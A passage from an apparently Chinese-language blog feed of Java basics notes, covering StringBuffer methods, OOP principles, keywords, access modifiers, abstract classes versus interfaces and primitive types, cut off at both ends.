个构造方法来创建一个字符串。</p><blockquote><p>1.StringBuffer() 构造一个空的字符串缓冲区，并且初始化为 16 个字符的容量。<br>2.StringBuffer(int length) 创建一个空的字符串缓冲区，并且初始化为指定长度 length 的容量。<br>3.StringBuffer(String str) 创建一个字符串缓冲区，并将其内容初始化为指定的字符串内容 str，字符串缓冲区的初始容量为 16 加上字符串 str 的长度。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">StringBuffer str1 = <span class="hljs-keyword">new</span> StringBuffer();<br>StringBuffer str2 = <span class="hljs-keyword">new</span> StringBuffer(<span class="hljs-number">10</span>);<br>StringBuffer str3 = <span class="hljs-keyword">new</span> StringBuffer(<span class="hljs-string">&quot;青春无悔&quot;</span>);<br>System.out.println(str1.capacity());    <span class="hljs-comment">// 输出 16 str1.capacity() 用于查看 str1 的容量</span><br>System.out.println(str2.capacity());    <span class="hljs-comment">// 输出 10</span><br>System.out.println(str3.capacity());    <span class="hljs-comment">// 输出 20</span><br></code></pre></div></td></tr></table></figure><h4 id="追加字符串"><a href="#追加字符串" class="headerlink" title="追加字符串"></a>追加字符串</h4><p>StringBuffer 类的 append() 方法用于向原有 StringBuffer 对象中追加字符串。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">StringBuffer 对象.append(String str)<br><br>StringBuffer buffer = <span class="hljs-keyword">new</span> StringBuffer(<span class="hljs-string">&quot;hello,&quot;</span>);    <span class="hljs-comment">// 创建一个 StringBuffer 对象</span><br>String str = <span class="hljs-string">&quot;World!&quot;</span>;<br>buffer.append(str);    <span class="hljs-comment">// 向 StringBuffer 对象追加 str 字符串</span><br><span class="hljs-comment">// 输出：Hello,World!</span><br></code></pre></div></td></tr></table></figure><h4 id="替换字符"><a href="#替换字符" class="headerlink" title="替换字符"></a>替换字符</h4><p>StringBuffer 类的 setCharAt() 方法用于在字符串的指定索引位置替换一个字符。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">StringBuffer 对象.setCharAt(<span class="hljs-keyword">int</span> index, <span class="hljs-keyword">char</span> ch);<br><br>StringBuffer sb = <span class="hljs-keyword">new</span> StringBuffer(<span class="hljs-string">&quot;hello&quot;</span>);<br>sb.setCharAt(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;E&#x27;</span>);<br>System.out.println(sb);    <span class="hljs-comment">// 输出：hEllo</span><br>sb.setCharAt(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;H&#x27;</span>);<br>System.out.println(sb);    <span class="hljs-comment">// 输出：HEllo</span><br>sb.setCharAt(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;p&#x27;</span>);<br>System.out.println(sb);    <span class="hljs-comment">// 输出：HEplo</span><br></code></pre></div></td></tr></table></figure><h4 id="反转字符串"><a href="#反转字符串" class="headerlink" title="反转字符串"></a>反转字符串</h4><p>StringBuffer 类中的 reverse() 方法用于将字符串序列用其反转的形式取代。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">StringBuffer 对象.reverse();<br><br>StringBuffer sb = <span class="hljs-keyword">new</span> StringBuffer(<span class="hljs-string">&quot;java&quot;</span>);<br>sb.reverse();<br>System.out.println(sb);    <span class="hljs-comment">// 输出：avaj</span><br></code></pre></div></td></tr></table></figure><h4 id="删除字符串"><a href="#删除字符串" class="headerlink" title="删除字符串"></a>删除字符串</h4><p>StringBuffer 类提供了 deleteCharAt() 和 delete() 两个删除字符串的方法。</p><h5 id="1-deleteCharAt-方法"><a href="#1-deleteCharAt-方法" class="headerlink" title="1.deleteCharAt() 方法"></a>1.deleteCharAt() 方法</h5><p>deleteCharAt() 方法用于移除(删除)序列中指定位置的字符，然后将剩余的内容形成一个新的字符串。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">StringBuffer 对象.deleteCharAt(<span class="hljs-keyword">int</span> index);<br><br>StringBuffer sb = <span class="hljs-keyword">new</span> StringBuffer(<span class="hljs-string">&quot;She&quot;</span>);<br>sb.deleteCharAt(<span class="hljs-number">2</span>);<br>System.out.println(sb);    <span class="hljs-comment">// 输出：Sh</span><br></code></pre></div></td></tr></table></figure><h5 id="2-delete-方法"><a href="#2-delete-方法" class="headerlink" title="2. delete() 方法"></a>2. delete() 方法</h5><p>delete() 方法用于移除序列中子字符串的字符。该方法的作用是删除指定区域以内的所有字符。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">StringBuffer 对象.delete(<span class="hljs-keyword">int</span> start,<span class="hljs-keyword">int</span> end);<br><span class="hljs-comment">//start 表示要删除字符的起始索引值（包括索引值所对应的字符），end 表示要删除字符串的结束索引值（不包括索引值所对应的字符）。</span><br><br>StringBuffer sb = <span class="hljs-keyword">new</span> StringBuffer(<span class="hljs-string">&quot;hello jack&quot;</span>);<br>sb.delete(<span class="hljs-number">2</span>,<span class="hljs-number">5</span>);<br>System.out.println(sb);    <span class="hljs-comment">// 输出：he jack</span><br>sb.delete(<span class="hljs-number">2</span>,<span class="hljs-number">5</span>);<br>System.out.println(sb);    <span class="hljs-comment">// 输出：heck</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JAVA基础知识复习(一)</title>
    <link href="/2021/04/08/JAVA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0/"/>
    <url>/2021/04/08/JAVA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>JAVA基础知识简单复习一。</p><p>[TOC]</p><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><h3 id="1-基本框架"><a href="#1-基本框架" class="headerlink" title="1.基本框架"></a>1.基本框架</h3><figure class="highlight java"><table><tr><td class="gutter hljs hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//创建文件 HelloWorld.java(文件名需与类名一致)</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloWorld</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;Hello World&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//注：String args[] 与 String[] args 都可以执行，但推荐使用 String[] args，这样可以避免歧义和误读。</span><br></code></pre></div></td></tr></table></figure><h4 id="1-1程序编译和运行"><a href="#1-1程序编译和运行" class="headerlink" title="1.1程序编译和运行"></a>1.1程序编译和运行</h4><p>在java环境文件夹目录下打开cmd(或者打开cmd后cd到java的环境文件夹中也行)。输入命令：</p><figure class="highlight java"><table><tr><td class="gutter hljs hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">javac HelloWorld.java <span class="hljs-comment">//编译</span><br>java HelloWorld <span class="hljs-comment">//运行。需要注意的是java命令后面不需要加.class</span><br></code></pre></div></td></tr></table></figure><hr><h3 id="2-java三大特性"><a href="#2-java三大特性" class="headerlink" title="2.java三大特性"></a>2.java三大特性</h3><figure class="highlight java"><table><tr><td class="gutter hljs hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">封装：封装把一个对象的属性私有化，同时提供一些可以被外界访问的属性的方法，如果属性不想被外界访问，我们大可不必提供方法给外界访问优点：减少耦合，代码重用，减轻维护<br>继承：它可以使用现有类的所有功能，并在无需重新编写原来的类的情况下对这些功能进行扩展。<br>多态：指允许不同类的对象对同一消息做出响应。<br></code></pre></div></td></tr></table></figure><p>多态一般分为编译时多态和运行时多态，编译时主要指方法的重载；运行时主要指程序中定义的对象引用所指向的具体类型在运行期间才确定</p><p>运行时多态有三个条件：继承、覆盖和重写、向上转型（父类引用指向子类对象）</p><hr><h3 id="3-java六大原则"><a href="#3-java六大原则" class="headerlink" title="3.java六大原则"></a>3.java六大原则</h3><figure class="highlight java"><table><tr><td class="gutter hljs hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-number">1.</span>开闭原则：对扩展开发放，对修改关闭，要求在添加新功能时不需要修改代码，符合开闭原则最典型的设计模式是装饰者模式<br><span class="hljs-number">2.</span>单一职责原则：一个类只负责一件事，尽量使用合成/聚合的方式，而不是使用继承。<br><span class="hljs-number">3.</span>里式替换原则 ：任何基类可以出现的地方，子类一定可以出现。<br><span class="hljs-number">4.</span>依赖倒转原则：依赖于抽象而不依赖于具体<br><span class="hljs-number">5.</span>接口隔离原则：使用多个隔离的接口，比使用单个接口要好 ，不应该强迫客户依赖于它们不用的方法。<br><span class="hljs-number">6.</span>迪米特法则：一个软件实体应当尽可能少地与其他实体发生相互作用。<br></code></pre></div></td></tr></table></figure><hr><h3 id="4-JAVA关键字"><a href="#4-JAVA关键字" class="headerlink" title="4.JAVA关键字"></a>4.JAVA关键字</h3><table><thead><tr><th align="left">类别</th><th align="left">关键字</th><th>说明</th></tr></thead><tbody><tr><td align="left">访问控制</td><td align="left">private</td><td>私有的</td></tr><tr><td align="left"></td><td align="left">protected</td><td>受保护的</td></tr><tr><td align="left"></td><td align="left">public</td><td>公共的</td></tr><tr><td align="left"></td><td align="left">default</td><td>默认</td></tr><tr><td align="left">类、方法和变量修饰符</td><td align="left">abstract</td><td>声明抽象</td></tr><tr><td align="left"></td><td align="left">class</td><td>类</td></tr><tr><td align="left"></td><td align="left">extends</td><td>扩充,继承</td></tr><tr><td align="left"></td><td align="left">final</td><td>最终值,不可改变的</td></tr><tr><td align="left"></td><td align="left">implements</td><td>实现（接口）</td></tr><tr><td align="left"></td><td align="left">interface</td><td>接口</td></tr><tr><td align="left"></td><td align="left">native</td><td>本地，原生方法（非 Java 实现）</td></tr><tr><td align="left"></td><td align="left">new</td><td>新,创建</td></tr><tr><td align="left"></td><td align="left">static</td><td>静态</td></tr><tr><td align="left"></td><td align="left">strictfp</td><td>严格,精准</td></tr><tr><td align="left"></td><td align="left">synchronized</td><td>线程,同步</td></tr><tr><td align="left"></td><td align="left">transient</td><td>短暂</td></tr><tr><td align="left"></td><td align="left">volatile</td><td>易失</td></tr><tr><td align="left">程序控制语句</td><td align="left">break</td><td>跳出循环</td></tr><tr><td align="left"></td><td align="left">case</td><td>定义一个值以供 switch 选择</td></tr><tr><td align="left"></td><td align="left">continue</td><td>继续</td></tr><tr><td align="left"></td><td align="left">default</td><td>默认</td></tr><tr><td align="left"></td><td align="left">do</td><td>运行</td></tr><tr><td align="left"></td><td align="left">else</td><td>否则</td></tr><tr><td align="left"></td><td align="left">for</td><td>循环</td></tr><tr><td align="left"></td><td align="left">if</td><td>如果</td></tr><tr><td align="left"></td><td align="left">instanceof</td><td>实例</td></tr><tr><td align="left"></td><td align="left">return</td><td>返回</td></tr><tr><td align="left"></td><td align="left">switch</td><td>根据值选择执行</td></tr><tr><td align="left"></td><td align="left">while</td><td>循环</td></tr><tr><td align="left">错误处理</td><td align="left">assert</td><td>断言表达式是否为真</td></tr><tr><td align="left"></td><td align="left">catch</td><td>捕捉异常</td></tr><tr><td align="left"></td><td align="left">finally</td><td>有没有异常都执行</td></tr><tr><td align="left"></td><td align="left">throw</td><td>抛出一个异常对象</td></tr><tr><td align="left"></td><td align="left">throws</td><td>声明一个异常可能被抛出</td></tr><tr><td align="left"></td><td align="left">try</td><td>捕获异常</td></tr><tr><td align="left">包相关</td><td align="left">import</td><td>引入</td></tr><tr><td align="left"></td><td align="left">package</td><td>包</td></tr><tr><td align="left">基本类型</td><td align="left">boolean</td><td>布尔型</td></tr><tr><td align="left"></td><td align="left">byte</td><td>字节型</td></tr><tr><td align="left"></td><td align="left">char</td><td>字符型</td></tr><tr><td align="left"></td><td align="left">double</td><td>双精度浮点</td></tr><tr><td align="left"></td><td align="left">float</td><td>单精度浮点</td></tr><tr><td align="left"></td><td align="left">int</td><td>整型</td></tr><tr><td align="left"></td><td align="left">long</td><td>长整型</td></tr><tr><td align="left"></td><td align="left">short</td><td>短整型</td></tr><tr><td align="left">变量引用</td><td align="left">super</td><td>父类,超类</td></tr><tr><td align="left"></td><td align="left">this</td><td>本类</td></tr><tr><td align="left"></td><td align="left">void</td><td>无返回值</td></tr><tr><td align="left">保留关键字</td><td align="left">goto</td><td>是关键字，但不能使用</td></tr><tr><td align="left"></td><td align="left">const</td><td>是关键字，但不能使用</td></tr><tr><td align="left"></td><td align="left">null</td><td>空</td></tr></tbody></table><hr><h3 id="5-java注释"><a href="#5-java注释" class="headerlink" title="5.java注释"></a>5.java注释</h3><p>支持单行以及多行注释。</p><figure class="highlight java"><table><tr><td class="gutter hljs hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">// 这是单行注释的示例</span><br><span class="hljs-comment">/* 这个也是单行注释的示例 */</span><br><span class="hljs-comment">/* 这是第一个Java程序</span><br><span class="hljs-comment">    * 它将输出 Hello World</span><br><span class="hljs-comment">    * 这是一个多行注释的示例</span><br><span class="hljs-comment">    */</span><br></code></pre></div></td></tr></table></figure><hr><h3 id="6-方法重载和重写的区别"><a href="#6-方法重载和重写的区别" class="headerlink" title="6.方法重载和重写的区别"></a>6.方法重载和重写的区别</h3><figure class="highlight java"><table><tr><td class="gutter hljs hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">重写：发生在继承类中，方法名和参数列表相同，重写有以下三个限制：<br><span class="hljs-number">1.</span>子类方法的访问权限必须大于等于父类方法。<br><span class="hljs-number">2.</span>子类方法的返回类型必须是父类方法返回类型或为其子类型。<br><span class="hljs-number">3.</span>子类方法抛出的异常类型必须是父类抛出异常类型或为其子类型。<br></code></pre></div></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter hljs hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">重载：发生在同一个类中，方法名相同，参数列表不同（个数、类型、顺序），与权限修饰、返回值类型、抛出异常无关。<br></code></pre></div></td></tr></table></figure><p>注意：构造器是不可以被重写的，但是能重载。<br>构造方法的特性：</p><figure class="highlight java"><table><tr><td class="gutter hljs hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-number">1.</span>名字与类名相同。<br><span class="hljs-number">2.</span>没有返回值，但不能用<span class="hljs-keyword">void</span>声明构造函数。<br><span class="hljs-number">3.</span>生成类的对象时自动执行，无需调用。<br></code></pre></div></td></tr></table></figure><hr><h3 id="7-常用关键字特性"><a href="#7-常用关键字特性" class="headerlink" title="7.常用关键字特性"></a>7.常用关键字特性</h3><p>Java中有4中访问权限的修饰符：private、default（(默认一般省略）、public、protected。一般用于对类或类中的成员（字段以及方法）加上访问修饰符。<br>权限的主要作用范围：同一个类中、同一个包下、父子类、不同的包<br>可被修饰对象：类和成员变量；类可见表示其它类可以用这个类创建实例对象；成员可见表示其它类可以用这个类的实例对象访问到该成员。<br>4种修饰符的权限范围：</p><blockquote><ul><li>private：指”私有的”。被其修饰的属性以及方法只能被该类的对象访问，其子类不能访问，更不能允许跨包访问</li><li>default：即不加任何访问修饰符，通常称为“默认访问权限“或者“包访问权限”。该模式下，只允许在同一个包中进行访问。</li><li>protected: 介于public 和 private 之间的一种访问修饰符，一般称之为“保护访问权限”。被其修饰的属性以及方法只能被类本身的方法及子类访问，即使子类在不同的包中也可以访问。</li><li>public： Java语言中访问限制最宽的修饰符，一般称之为“公共的”。被其修饰的类、属性以及方法不仅可以跨类访问，而且允许跨包访问。</li></ul></blockquote><table><thead><tr><th>修饰符</th><th>同类</th><th>同包</th><th>子类</th><th>不同包非子类</th></tr></thead><tbody><tr><td>private</td><td>√</td><td>×</td><td>×</td><td>×</td></tr><tr><td>default</td><td>√</td><td>√</td><td>×</td><td>×</td></tr><tr><td>protected</td><td>√</td><td>√</td><td>√</td><td>×</td></tr><tr><td>public</td><td>√</td><td>√</td><td>√</td><td>√</td></tr></tbody></table><p>很容易看出，权限范围从小到大依次为：private &lt; default &lt; protected &lt; public</p><h4 id="final和static"><a href="#final和static" class="headerlink" title="final和static"></a>final和static</h4><p>final</p><hr><p>在Java中，final关键字可以用来修饰类、方法和变量（包括成员变量和局部变量）</p><ul><li>修饰变量：表示常量，对于基本类型，final 使数值不变；对于引用类型，final 使引用地址不变，但对象本身的属性是可以被修改的。</li><li>修饰方法：不能被子类的方法重写，但可以被继承，不能修饰构造方法。。</li><li>修饰类 ：该不能被继承，没有子类，final类中的方法默认是final的。Java中的String类就是一个final类</li></ul><p>static</p><hr><p>在Java语言中，static 可以用来修饰成员变量和成员方法，当然也可以是静态代码块</p><ul><li>静态变量：又称为类变量，该类的所有实例都共享本类的静态变量，且在内存中只存在一份</li><li>静态方法：在类加载的时候就存在了，它不依赖于任何实例，只能访问所属类的静态字段和静态方法，方法中不能有 this 和 super 关键字（此时可能没有实例）。</li><li>静态语句块：在类初始化时运行一次。</li><li>静态内部类：非静态内部类依赖于外部类的实例，而静态内部类不需要。静态内部类不能访问外部类的非静态的变量和方法。</li></ul><p>需要注意的是：</p><figure class="highlight java"><table><tr><td class="gutter hljs hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-number">1.</span>静态变量，静态方法可以通过类名直接访问<br><span class="hljs-number">2.</span>初始化顺序：静态变量和静态语句块优先于实例变量和普通语句块，静态变量和静态语句块的初始化顺序取决于它们在代码中的顺序。（此处不演示，在类初始化篇章中演示）<br></code></pre></div></td></tr></table></figure><p>由于静态方法可以不通过对象进行调用，因此在静态方法里，不能调用其他非静态变量，也不可以访问非静态变量成员。</p><h4 id="成员变量、静态变量、局部变量的区别"><a href="#成员变量、静态变量、局部变量的区别" class="headerlink" title="成员变量、静态变量、局部变量的区别"></a>成员变量、静态变量、局部变量的区别</h4><p>从生命周期比较：</p><ul><li><p>静态变量可以被对象调用，也可以被类名调用。以static关键字申明的变量，其独立在对象之外，有许多对象共享的变量。在对象产生之前产生，存在于方法区静态区中。</p></li><li><p>成员变量只能被对象调用。随着对象创建而存在，随对象销毁而销毁。存在于堆栈内存中</p></li><li><p>局部变量在方法或语句块中申明的变量，生命周期只在定义的{}之中，不能跨方法或语句块使用。</p></li></ul><p>从访问权限比较：</p><ul><li><p>静态变量称为对象的共享数据，成员变量可以称为对象的特有数据，局部变量为方法所有</p></li><li><p>成员变量可以被 public,private,static 等修饰符所修饰，而局部变量不能被访问控制修饰符及 static 所修饰；但是，成员变量和局部变量都能被 final 所修饰。</p></li></ul><h4 id="abstract-和-interface"><a href="#abstract-和-interface" class="headerlink" title="abstract 和 interface"></a>abstract 和 interface</h4><p>abstract<br>在 Java 中 abstract 即抽象，一般使用 abstract 关键字修饰的类或方法.<br>修饰的类时</p><blockquote><p>1.不能被实例化，需要继承抽象类才能实例化其子类。<br>2.访问权限可以使用public、private、protected，其表达形式为：（public）abstract class 类名{}<br>3.抽象类不能使用final关键字修饰，因为final修饰的类是无法被继承<br>4.可以定义构造方法、静态方法、普通方法；非抽象的普通成员变量、静态成员变量</p></blockquote><p>修饰的方法时</p><blockquote><p>1.含有该抽象方法的类必须定义为抽象类，但抽象类可以没有抽象方法。<br>2.访问权限可以使用public、default、protected，不能为private，因为抽象方法必须被子类实现（覆写），而private权限对于子类来 说是不能访问的，所以就会产生矛盾，<br>3.不能用static修饰，因为没有主体</p></blockquote><p>例如：</p><figure class="highlight java"><table><tr><td class="gutter hljs hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span>  <span class="hljs-class"><span class="hljs-keyword">class</span>  <span class="hljs-title">MyAbstract</span> </span>&#123;<br><span class="hljs-keyword">public</span> String name=<span class="hljs-string">&quot;小米&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> price= <span class="hljs-number">1800</span>;<br><br>MyAbstract(String name)&#123;<br><span class="hljs-keyword">this</span>.name = name;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">test</span><span class="hljs-params">()</span> </span>&#123;<br>System.out.println(name);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">fun</span><span class="hljs-params">()</span> </span>&#123;<br>System.out.println(price);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title">print</span><span class="hljs-params">()</span></span>;<span class="hljs-comment">//权限不能为 private</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>interface<br>在 Java中 interface 即接口，是抽象类的延伸，在 Java 8 之前，它可以看成是一个完全抽象的类，Java 8 开始，接口也可以拥有default的方法实现，是因为不支持默认方法的接口的维护成本太高.</p><blockquote><p>1.接口的方法访问权限只能为 public ，Java 8可以为default，但是必须有方法体<br>2.接口的方法默认public abstract 也可以由 static 修饰<br>3.接口的方法可以定义为 public static ，但是必须有方法体，且只能有接口类名调用<br>4.成员变量默认为public staic final</p></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span>  <span class="hljs-title">MyInterface</span> </span>&#123;<br><span class="hljs-keyword">int</span> price = <span class="hljs-number">1800</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">outName</span><span class="hljs-params">()</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">default</span> <span class="hljs-keyword">void</span> <span class="hljs-title">print</span><span class="hljs-params">()</span> </span>&#123;<br>System.out.println(<span class="hljs-string">&quot;MyInterface print： default Method&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">price</span><span class="hljs-params">()</span> </span>&#123;<br>System.out.println(<span class="hljs-string">&quot;MyInterface price=&quot;</span>+price);<br>&#125;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyInterfaceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">MyInterface</span> </span>&#123;<br><span class="hljs-meta">@Override</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">outName</span><span class="hljs-params">()</span> </span>&#123;<br> System.out.println(<span class="hljs-string">&quot;I&#x27;m a MyInterfaceImpl&quot;</span>);<br>&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>MyInterface my = <span class="hljs-keyword">new</span> MyInterfaceImpl();<br>my.outName();<br>my.print();<br><span class="hljs-comment">//MyInterfaceImpl.print();// 实现类类名调用时， 提示编译错误</span><br>MyInterface.price();<br>&#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>abstract 和 interface 的区别<br>从定义分析</p><ul><li><p>抽象类和接口都不能直接实例化；抽象方法必须由子类来进行重写</p></li><li><p>抽象类单继承，接口多实现</p></li><li><p>抽象类可有构造方法，普通成员变量，非抽象的普通方法，静态方法</p></li><li><p>抽象类的抽象方法访问权限可以为：public、protected 、default</p></li><li><p>接口中变量类型默认public staic final，</p></li><li><p>接口中普通方法默认public abstract，没有具体实现</p></li><li><p>jdk1.8 中接口可有静态方法和default（有方法体）方法</p></li></ul><p>从应用场合分析</p><ul><li><p>接口：需要将一组类视为单一的类，而调用者只通过接口来与这组类发生联系。</p></li><li><p>抽象类：1、在既需要统一的接口，又需要实例变量或缺省的方法的情况下就可以使用它；2、定义了一组接口，但又不想强迫每个实现类都必须实现所有的接口</p></li></ul><hr><h3 id="8-数据类型"><a href="#8-数据类型" class="headerlink" title="8.数据类型"></a>8.数据类型</h3><p>Java 语言提供了八种基本类型：六种数字类型（四个整数型，两个浮点型），一种字符类型，还有一种布尔型。并且还提供了其对应的引用类型。</p><h4 id="char"><a href="#char" class="headerlink" title="char"></a>char</h4><p>在 Java 中是用 unicode来表示字符，所以 2 个字节来表示一个字符； 一个数字或英文或汉字都是一个字符，只不过数字和英文时，存储的2个字节的第一个字节都为0，就是浪费了点空间。存汉字就占满了2个字节。</p><h4 id="boolean"><a href="#boolean" class="headerlink" title="boolean"></a>boolean</h4><p>在 Java 基本类型中只有两个状态，true、false，理论上只占一个字节，但是实际如下：</p><ul><li>单个的boolean类型变量在编译的时候是使用的 int 类型，即 boolean a = true 时，这个a在 JVM 中占用 4 个字节，即32位；</li><li>boolean类型的数组时，在编译时是作为byte array来编译的。所以，boolean数组里的每一个元件占用一个字节；即 boolean[] b = new boolean[10] 的数组时，每一个boolean在 JVM中占一个字节；</li></ul><p><strong>注意</strong>： float 和 double 都不能表示精确的值，所以一般不能用在计算货币，要想精度不失效，可以使用 BigDecimal</p><h4 id="引用类型"><a href="#引用类型" class="headerlink" title="引用类型"></a>引用类型</h4><p>在 Java 中引用类型指向一个对象，指向对象的变量是引用变量。这些变量在声明时被指定为一个特定的类型，比如 Employee、Puppy 等。变量一旦声明后，类型就不能被改变了。</p><ul><li>对象、数组都是引用数据类型；</li><li>所有引用类型的默认值都是null；</li><li>一个引用变量可以用来引用任何与之兼容的类型<br>我们的基本类型都有对应的引用类型，且基本类型与其对应的引用类型之间的赋值使用自动装箱与拆箱完成<h4 id="自动装箱和拆箱"><a href="#自动装箱和拆箱" class="headerlink" title="自动装箱和拆箱"></a>自动装箱和拆箱</h4>自动拆箱：故名思议就是将对象重新转化为基本数据类型；是享元模式（flyweight）<figure class="highlight java"><table><tr><td class="gutter hljs hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Integer num = <span 